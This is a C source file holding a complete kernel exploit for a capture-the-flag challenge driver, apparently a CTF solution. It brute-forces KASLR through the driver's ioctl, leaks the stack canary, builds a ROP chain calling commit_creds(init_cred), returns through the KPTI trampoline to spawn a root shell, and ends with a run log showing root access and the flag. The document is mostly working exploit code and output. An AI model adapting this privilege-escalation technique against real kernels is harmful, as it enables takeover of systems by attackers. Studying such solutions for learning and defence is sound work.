#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>

#define PAGE 0x1000
#define KADDR(x) x + kaslr

int fd;
unsigned long kaslr;
unsigned long stack;
unsigned long canary;
int CANARY_OFFSET = 8;
unsigned long canary_ptr;
unsigned long uuid_offset = 0x22c1e00;
// unsigned long canary_ptr_offset = 0xffffffff8374aac8 - 0xffffffff81000000;
unsigned long canary_ptr_offset = 0xffffffff91a03c80 - 0xffffffff8fa00000;

unsigned long user_cs, user_ss, user_sp, user_rflags;

// ================================ GADGETS ================================
unsigned long pop_rdi = 0xffffffff8101d675 - 0xffffffff81000000;
unsigned long init_cred = 0xffffffff8308b2e0 - 0xffffffff81000000;
unsigned long commit_creds = 0xffffffff810ff8a0 - 0xffffffff81000000;
unsigned long kpti_trampoline = 0xffffffff82001189 - 0xffffffff81000000;    // kpti_trampoline + <some offset>

typedef struct {
    unsigned long* ptr;
    char msg[256];
} request;

void examine(unsigned long* buffer, int n){
    for (int i = 0; i < n; i++){
        printf("[%d] 0x%lx\n", i, buffer[i]);
    }
}

// shamelesslly copied from online :)
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void win(){
    printf("Out of trampoline!!!");
    system("/bin/sh");
    exit(0);
}

unsigned long arb_addr_read(unsigned long addr, request* req){
    req->ptr = addr;
    ioctl(fd, 0x1337, req);
    return *((unsigned long*)req->msg);
}

int main(){
    printf("[!] Hello World!\n");
    signal(SIGSEGV, win);

    request* req = (request*)malloc(sizeof(request));
    unsigned long* rop = (unsigned long*)mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset((char*)rop, 0, PAGE);

    fd = open("/dev/window", O_RDWR);
    if (fd == -1) perror("open");
    else printf("[+] Driver open success!\n");

    // copy_to_user will not fail if we enter invalid address
    // therefore we can bruteforce kaslr and stack with it

    // KASLR leak
    // 0xFFFFFFFF832C1E00 - 68F2D50B-C469-4d8A-BD3D-941A103FD3FC
    for (kaslr = 0xffffffff00000000; kaslr < 0xfffffffffff00000; kaslr += 0x100000) {
        req->ptr = kaslr + uuid_offset;
        ioctl(fd, 0x1337, req);
        if (!strncmp("68F2D50B-C469-4d8A-BD3D-941A103FD3FC", req->msg, sizeof("68F2D50B-C469-4d8A-BD3D-941A103FD3FC"))) {
            // printf("[0x%lx] %s\n", req->ptr, req->msg);
            break;
        }
    }

    printf("[+] Kaslr: 0x%lx\n", kaslr);
    printf("[+] POP RDI: 0x%lx\n", KADDR(pop_rdi));
    printf("[+] INIT_CRED: 0x%lx\n", KADDR(init_cred));
    printf("[+] COMMIT CRED: 0x%lx\n", KADDR(commit_creds));

    // CANARY leak
    unsigned long canary_ptr = arb_addr_read(KADDR(canary_ptr_offset), req);
    printf("[+] canary ptr: 0x%lx\n", canary_ptr);

    canary = arb_addr_read(canary_ptr - 0x31358, req);
    printf("[+] canary: 0x%lx\n", canary);

    // ROP ROP ROP ROP ROP ROP ROP ROP ROP ROP ROP ROP ROP
    save_state();

    unsigned long *r = &rop[CANARY_OFFSET];
    *r++ = canary;
    *r++ = 0;
    *r++ = KADDR(pop_rdi);
    *r++ = KADDR(init_cred);
    *r++ = KADDR(commit_creds);
    *r++ = KADDR(kpti_trampoline);
    *r++ = 0;
    *r++ = 0;
    *r++ = &win;
    *r++ = user_cs;
    *r++ = user_rflags;
    *r++ = (user_sp);
    *r++ = user_ss;

    write(fd, rop, 0x200);
    return 0;    
}


/*
mount: mounting host0 on /tmp/mount failed: No such device

Boot time: 3.91

---------------------------------------------------------------
                     _
                    | |
       __      _____| | ___ ___  _ __ ___   ___
       \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
        \ V  V /  __/ | (_| (_) | | | | | |  __/_
         \_/\_/ \___|_|\___\___/|_| |_| |_|\___(_)

  Take the opportunity. Look through the window. Get the flag.
---------------------------------------------------------------
/ $ cat /flag.txt
cat /flag.txt
cat: can't open '/flag.txt': Permission denied
/ $ ./exploit
./exploit
[!] Hello World!
[+] Driver open success!
[+] Kaslr: 0xffffffff81800000
[+] POP RDI: 0xffffffff8181d675
[+] INIT_CRED: 0xffffffff8388b2e0
[+] COMMIT CRED: 0xffffffff818ff8a0
[+] canary ptr: 0xffff93b18f631380
[+] canary: 0xde26cb5cd1b4a900
[*] Saved state
/ # cat /flag.txt
cat /flag.txt
Hopefully this was a fun beginner kernel challenge! I welcome any feedback. If you cheesed it please do tell me.

Please also tell me if you have any tips for learning kernel pwn.

Environment setup created by thy.isnis. Used with permission.

Oh, and by the way, the flag is ictf{th3_real_flag_was_the_f4ke_st4ck_canaries_we_met_al0ng_the_way}
/ # id
id
uid=0(root) gid=0(root)
/ #

*/